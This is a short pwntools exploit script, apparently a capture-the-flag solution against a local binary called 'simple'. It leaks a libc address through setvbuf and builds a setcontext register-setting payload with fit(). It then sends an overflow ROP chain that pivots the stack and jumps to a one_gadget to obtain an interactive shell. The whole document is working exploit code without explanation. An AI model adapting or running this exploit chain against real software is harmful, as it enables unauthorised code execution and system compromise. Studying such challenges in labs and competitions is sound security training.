from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')
elf  = ELF('./simple')

r = process('./simple')

rop  = elf.symbols['rop']
pop_rdi = 0x0000000000400723
libc_base = int(r.recvline()[-15:], 16) - libc.symbols['setvbuf']
setcontext = libc_base + libc.symbols['setcontext']
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[2]

payload = fit({
		0x28: flat(0), # r8
		0x30: flat(0), # r9
		0x48: flat(0), # r12
		0x50: flat(0), # r13
		0x58: flat(0), # r14
		0x60: flat(0), # r15
		0x68: flat(0), # rdi
		0x70: flat(0), # rsi
		0x78: flat(0), # rbp
		0x80: flat(0), # rbx
		0x88: flat(0), # rdx
		0x98: flat(0), # rcx2
	   	0xa0: flat(rop+8), # rsp
	   	0xa8: flat(one_shot), # rcx1
	},filler=(ord('\x00'),))

r.sendlineafter('rop:', payload)

gdb.attach(r, 'b *0x4006ba\nc')
r.sendlineafter('ch:', 'a'*0x10+flat(rop, pop_rdi, rop, setcontext+53))

r.interactive()